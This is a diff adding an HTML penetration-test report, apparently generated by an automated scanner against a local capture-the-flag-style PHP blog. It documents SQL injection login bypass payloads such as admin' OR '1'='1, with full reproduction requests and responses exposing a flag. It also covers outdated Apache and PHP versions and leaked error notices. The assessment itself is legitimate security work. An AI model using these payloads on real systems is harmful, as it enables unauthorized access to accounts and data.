@@ -1,0 +1,1074 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqy35fig-jneldy</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [sqli] SQL injection authentication bypass in /admin.php login (username field)</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [vulnerable-component] Outdated Apache httpd 2.4.54 (Debian) — multiple known CVEs (e.g. CVE-2023-25690 request smuggling, CVE-2024-38476 SSRF)</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#d32f2f">HIGH</span> [vulnerable-component] End-of-life PHP 7.4.33 — unsupported branch, unpatched CVE-2023-3824 (phar overflow → RCE) &amp; CVE-2023-3823 (XXE)</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#c9a227">LOW</span> [info-disclosure] PHP error notices leak server path and language on every page load</a></li>
+<li><a href="#finding-5">5. <span class="sev" style="color:#5f7d8c">INFO</span> [burp] Path-relative style sheet import (3 URLs)</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqy35fig-jneldy</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32821/</code></td></tr>
+<tr><td>Started</td><td>2026-06-28T17:51:33.299Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>4 mapped · 4 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>5</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32821</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>5 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">1</b> critical</span><span><b style="color:#d32f2f">2</b> high</span><span><b style="color:#c9a227">1</b> low</span><span><b style="color:#5f7d8c">1</b> info</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [sqli] SQL injection authentication bypass in /admin.php login (username field)</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32821/</div>
+<div class="desc">The admin login at POST /admin.php builds its SQL query by concatenating the unsanitized `username` POST parameter. A single quote (`username='`) breaks the query, producing a PHP error (`Trying to get property 'num_rows' of non-object in /var/www/html/admin.php on line 24`), confirming the value is interpolated directly into SQL. A boolean-tautology / comment payload in `username` (e.g. `admin' OR '1'='1`, `admin'--`, `' OR 1=1--`) makes the query return rows, authenticating the request without valid credentials. The bypassed response omits the &quot;Invalid username or password.&quot; error and discloses an admin secret: `flag{c969819d-7a14-4c90-b85d-51eccd232580}`. Impact: full authentication bypass + sensitive data disclosure with no credentials.</div>
+<div><b>Reproduction</b></div><pre>1. Negative control (injection that does NOT authenticate): POST /admin.php body `username='&amp;password=x` → 200, 831 bytes, PHP SQL error + &quot;Invalid username or password.&quot;, NO flag (ev-mqy3ckgv-g).
+2. Bypass (replay 1): POST `username=admin' OR '1'='1&amp;password=x` → 200, 688 bytes, no error, body begins with `flag{c969819d-7a14-4c90-b85d-51eccd232580}` (ev-mqy3clwt-h).
+3. Bypass (replay 2): POST `username=admin'-- &amp;password=x` → identical flag response (ev-mqy3cndd-i).
+4. Bypass (replay 3): POST `username=' OR 1=1-- &amp;password=x` → identical flag response (ev-mqy3co61-j).
+Additional control: wrong credentials `username=nonexistentuser_zzz&amp;password=wrongpass_zzz` → 200, 702 bytes, &quot;Invalid username or password.&quot;, no flag (ev-mqy3cada-f).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3ckgv-g</code> — <code>artifacts/s-0002/ev-mqy3ckgv-g/</code></div><div class="lbl">REQUEST</div><pre>POST /admin.php HTTP/1.1
+Host: target.local:32821
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+username=%27&amp;password=x</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 831
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 17:57:06 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.54 (Debian)
+set-cookie: &lt;redacted&gt;
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Trying to get property 'num_rows' of non-object in &lt;b&gt;/var/www/html/admin.php&lt;/b&gt; on line &lt;b&gt;24&lt;/b&gt;&lt;br /&gt;
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Admin Login&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Admin Login&lt;/h1&gt;
+    &lt;p style='color: red;'&gt;Invalid username or password.&lt;/p&gt;    &lt;form action=&quot;admin.php&quot; method=&quot;POST&quot;&gt;
+        &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;
+        &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;
+        &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;
+        &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;
+    &lt;/form&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3clwt-h</code> — <code>artifacts/s-0002/ev-mqy3clwt-h/</code></div><div class="lbl">REQUEST</div><pre>POST /admin.php HTTP/1.1
+Host: target.local:32821
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+username=admin%27+OR+%271%27%3D%271&amp;password=x</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 688
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 17:57:07 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=99
+pragma: no-cache
+server: Apache/2.4.54 (Debian)
+set-cookie: &lt;redacted&gt;
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+flag{c969819d-7a14-4c90-b85d-51eccd232580}
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Admin Login&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Admin Login&lt;/h1&gt;
+        &lt;form action=&quot;admin.php&quot; method=&quot;POST&quot;&gt;
+        &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;
+        &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;
+        &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;
+        &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;
+    &lt;/form&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3cndd-i</code> — <code>artifacts/s-0002/ev-mqy3cndd-i/</code></div><div class="lbl">REQUEST</div><pre>POST /admin.php HTTP/1.1
+Host: target.local:32821
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+username=admin%27--+&amp;password=x</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 688
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 17:57:09 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=98
+pragma: no-cache
+server: Apache/2.4.54 (Debian)
+set-cookie: &lt;redacted&gt;
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+flag{c969819d-7a14-4c90-b85d-51eccd232580}
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Admin Login&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Admin Login&lt;/h1&gt;
+        &lt;form action=&quot;admin.php&quot; method=&quot;POST&quot;&gt;
+        &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;
+        &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;
+        &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;
+        &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;
+    &lt;/form&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3co61-j</code> — <code>artifacts/s-0002/ev-mqy3co61-j/</code></div><div class="lbl">REQUEST</div><pre>POST /admin.php HTTP/1.1
+Host: target.local:32821
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+username=%27+OR+1%3D1--+&amp;password=x</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 688
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 17:57:10 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=97
+pragma: no-cache
+server: Apache/2.4.54 (Debian)
+set-cookie: &lt;redacted&gt;
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+flag{c969819d-7a14-4c90-b85d-51eccd232580}
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Admin Login&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Admin Login&lt;/h1&gt;
+        &lt;form action=&quot;admin.php&quot; method=&quot;POST&quot;&gt;
+        &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;
+        &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;
+        &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;
+        &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;
+    &lt;/form&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [vulnerable-component] Outdated Apache httpd 2.4.54 (Debian) — multiple known CVEs (e.g. CVE-2023-25690 request smuggling, CVE-2024-38476 SSRF)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32821/</div>
+<div class="desc">VERSION-BASED finding (matched by banner, not exploited). The server identifies itself as `Apache/2.4.54 (Debian)` via the `Server` response header (confirmed independently by fingerprint_scan and by the ServerSignature in the 404 page footer: &quot;Apache/2.4.54 (Debian) Server at ... Port 32821&quot;). Apache httpd 2.4.54 was released 2022-06-08 and is superseded by many security releases. Known CVEs fixed AFTER 2.4.54 that therefore affect this version include: CVE-2023-25690 (HTTP request smuggling via mod_proxy + certain RewriteRule/ProxyPassMatch configs, CVSS 9.8 — fixed 2.4.56); CVE-2024-38476 (backend response headers can drive SSRF / local handler invocation / info disclosure, CVSS 9.8 — fixed 2.4.60); CVE-2024-38474/38475 (mod_rewrite encoding → source disclosure / potential code execution — fixed 2.4.60); CVE-2024-27316 (HTTP/2 CONTINUATION-flood memory-exhaustion DoS — fixed 2.4.59); CVE-2023-31122 (mod_macro out-of-bounds read — fixed 2.4.58); CVE-2022-36760/CVE-2022-37436 (mod_proxy_ajp / mod_proxy response splitting &amp; smuggling — fixed 2.4.55). The most severe are critical (9.8) but their exploitability is module/config-dependent (require mod_proxy / mod_rewrite / mod_http2 to be enabled and configured a particular way), which is why this is rated high rather than critical and is reported as version-based. Operator action: confirm enabled modules/config, then upgrade to a current 2.4.x (&gt;= 2.4.62 at time of writing). Also consider suppressing ServerTokens/ServerSignature to stop leaking the exact build.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32821/ → 200, response carries `Server: Apache/2.4.54 (Debian)` (ev-mqy3r4iy-1r). 2. Repeat GET / → identical 200, same banner (stable) (ev-mqy3r4iy-1r / ev-mqy3r58w-1s on /index.php). 3. The 404 page (GET a non-existent path) footer also prints `Apache/2.4.54 (Debian) Server at target.local Port 32821`, re-confirming the exact build (ev-mqy3r65a-1t). Map the version to the post-2.4.54 CVE list above.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3r65a-1t</code> — <code>artifacts/_/ev-mqy3r65a-1t/</code></div><div class="lbl">REQUEST</div><pre>GET /verdict-nonexistent-path-xyz-404 HTTP/1.1
+Host: target.local:32821
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 279
+content-type: text/html; charset=iso-8859-1
+date: Sun, 28 Jun 2026 18:08:27 GMT
+keep-alive: timeout=5, max=98
+server: Apache/2.4.54 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 32821&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3r4iy-1r</code> — <code>artifacts/_/ev-mqy3r4iy-1r/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32821
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 5666
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 18:08:25 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    &lt;div class='post'&gt;
+                    &lt;h2&gt;The Magic of Morning Dew&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Sunset Serenades&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Forest Whisperings&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Decoding Tech Trends&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Future of Robotics&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Mediterranean Diet Secrets&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Art of French Baking&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Master the art of French baking with these simple steps for making the perfect croissant....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Beyond the Camera Lens&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Urban Photography Tips&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Healing Power of Yoga&lt;/h2&gt;
+                    &lt;p&gt;Category: Health&lt;/p&gt;
+                    &lt;img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....&lt;/p&gt;
+                &lt;/div&gt;&lt;/div&gt;
+&lt;a href=&quot;admin.php&quot;&gt;Admin Login&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3r58w-1s</code> — <code>artifacts/_/ev-mqy3r58w-1s/</code></div><div class="lbl">REQUEST</div><pre>GET /index.php HTTP/1.1
+Host: target.local:32821
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 5666
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 18:08:26 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    &lt;div class='post'&gt;
+                    &lt;h2&gt;The Magic of Morning Dew&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....&lt;/p&gt;
